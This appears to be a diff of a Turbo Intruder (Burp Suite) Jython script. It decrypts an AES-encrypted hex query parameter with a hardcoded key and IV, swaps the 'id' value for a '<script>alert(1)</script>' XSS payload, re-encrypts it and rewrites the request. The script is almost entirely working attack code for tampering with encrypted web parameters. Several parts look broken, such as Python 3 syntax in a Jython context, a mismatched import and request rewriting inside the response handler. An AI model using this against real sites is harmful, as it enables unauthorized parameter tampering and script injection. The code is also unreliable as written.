@@ -262,29 +262,89 @@ def handleResponse(req, interesting):
 
 
 edit
+from turbo_intruder import Request
 from javax.crypto import Cipher
 from javax.crypto.spec import SecretKeySpec, IvParameterSpec
-from java.lang import String
-from java.util import Base64
+from java.nio.charset import StandardCharsets
+from jarray import array
+import re
 
-def aes_encrypt(data, key, iv):
-    key_spec = SecretKeySpec(key.encode('utf-8'), "AES")
-    iv_spec = IvParameterSpec(iv.encode('utf-8'))
-    cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
-    cipher.init(Cipher.ENCRYPT_MODE, key_spec, iv_spec)
-    return cipher.doFinal(data)
-
-def aes_decrypt(enc_data, key, iv):
-    key_spec = SecretKeySpec(key.encode('utf-8'), "AES")
-    iv_spec = IvParameterSpec(iv.encode('utf-8'))
-    cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
-    cipher.init(Cipher.DECRYPT_MODE, key_spec, iv_spec)
-    return cipher.doFinal(enc_data)
-
+# AES helpers
+def to_signed_java_byte_array(py_bytes):
+    return array([(b if b < 128 else b - 256) for b in py_bytes], 'b')
 
 def hex_to_bytes(hex_str):
-    return bytearray.fromhex(hex_str)
+    return bytes.fromhex(hex_str)
 
-def bytes_to_hex(byte_array):
-    return ''.join(format(x, '02x') for x in byte_array)
+def bytes_to_hex(byte_arr):
+    return ''.join(f'{(b + 256) % 256:02x}' for b in byte_arr)
 
+def aes_decrypt(hex_data, key, iv):
+    cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
+    key_spec = SecretKeySpec(key.encode("utf-8"), "AES")
+    iv_spec = IvParameterSpec(iv.encode("utf-8"))
+    cipher.init(Cipher.DECRYPT_MODE, key_spec, iv_spec)
+    decrypted = cipher.doFinal(to_signed_java_byte_array(hex_to_bytes(hex_data)))
+    return decrypted.decode('utf-8', errors='ignore')
+
+def aes_encrypt(plain_text, key, iv):
+    cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
+    key_spec = SecretKeySpec(key.encode("utf-8"), "AES")
+    iv_spec = IvParameterSpec(iv.encode("utf-8"))
+    cipher.init(Cipher.ENCRYPT_MODE, key_spec, iv_spec)
+    encrypted = cipher.doFinal(to_signed_java_byte_array(plain_text.encode("utf-8")))
+    return bytes_to_hex(encrypted)
+
+# Your key and IV
+key = "58945803628475210256298743257410"[0:16]
+iv = "2578018473365974"
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=1,
+                           pipeline=False)
+
+    for request in wordlists:
+        engine.queue(request)
+
+def handleResponse(req, interesting):
+    original = req.toString()
+    
+    # Match both GET and POST requests with encrypted hex after '?'
+    match = re.search(r'(GET|POST)\s+[^\s]*\?([a-fA-F0-9]+)', original)
+    if not match:
+        print("No encrypted value found")
+        return
+
+    encrypted_hex = match.group(2)
+    print(f"[+] Encrypted data: {encrypted_hex}")
+
+    try:
+        decrypted = aes_decrypt(encrypted_hex, key, iv)
+        print(f"[+] Decrypted data: {decrypted}")
+    except Exception as e:
+        print(f"[!] Decryption error: {e}")
+        return
+
+    # Modify the id param
+    parts = decrypted.split('&')
+    new_parts = []
+    for part in parts:
+        if part.startswith("id="):
+            new_parts.append("id=<script>alert(1)</script>")
+        else:
+            new_parts.append(part)
+    modified_data = '&'.join(new_parts)
+    print(f"[+] Modified data: {modified_data}")
+
+    try:
+        re_encrypted = aes_encrypt(modified_data, key, iv)
+        print(f"[+] Re-encrypted hex: {re_encrypted}")
+    except Exception as e:
+        print(f"[!] Encryption error: {e}")
+        return
+
+    # Replace the encrypted string in the request
+    new_request = original.replace(encrypted_hex, re_encrypted)
+    req.setRaw(new_request)
